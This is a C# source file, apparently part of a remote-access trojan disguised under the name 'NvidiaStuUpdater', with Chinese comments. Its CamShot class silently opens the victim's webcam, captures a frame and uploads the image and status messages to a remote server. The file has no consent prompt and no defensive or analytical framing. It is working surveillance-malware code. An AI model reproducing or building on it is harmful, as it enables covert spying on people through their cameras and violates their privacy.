using AForge.Controls;
using AForge.Video.DirectShow;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NvidiaStuUpdater
{
    //摄像头拍照功能
    class CamShot
    {
        private DialogToServer dtc;//与服务器的对话
        private FilterInfoCollection videoDevices;
        private VideoCaptureDevice videoDevice;//摄像头
        private VideoSourcePlayer videoSourcePlayer1;
        private int CameraCount = 0;
        private int ShotIndex = 0;
        private int timeout = 2000;
        public CamShot(DialogToServer dtc, int index = 0,int timeout = 2000)
        {
            this.dtc = dtc;
            this.ShotIndex = index;
            this.timeout = timeout;
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            this.CameraCount = videoDevices.Count;

            if (CameraCount == 0 || videoDevices == null)
            {
                //无摄像头
                dtc.sendMsgToSever("没有摄像头");
                return;
            }

            this.Shot();
        }

        private void Form1_Load()
        {
           
        }

        public void Shot()
        {
            if (ShotIndex >= CameraCount)
            {
                dtc.sendMsgToSever("没有更多的相机");
                return;
            }
            this.videoSourcePlayer1 = new AForge.Controls.VideoSourcePlayer();
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            VideoCaptureDevice device = new VideoCaptureDevice(videoDevices[0].MonikerString);
            device.VideoResolution = device.VideoCapabilities[0];
            videoSourcePlayer1.VideoSource = device;
            videoSourcePlayer1.Start();
            
            
            //开始拍照
            Bitmap bitmap = null;
            DateTime Time1 = DateTime.Now;
            try
            {
                while (bitmap == null) 
                {
                    bitmap = videoSourcePlayer1.GetCurrentVideoFrame();
                    if ((DateTime.Now - Time1).TotalMilliseconds >= timeout)
                    {
                        dtc.sendMsgToSever("打开摄像机超时");
                        throw new Exception("打开摄像机超时");
                    }
                }
                videoSourcePlayer1.SignalToStop();
                videoSourcePlayer1.WaitForStop();
                dtc.sendBitmapToServer(bitmap);
                bitmap.Dispose();
            }
            catch (Exception ex)
            {
                dtc.sendMsgToSever("拍照出现错误:" + ex.Message);
            }
        }
    }
}
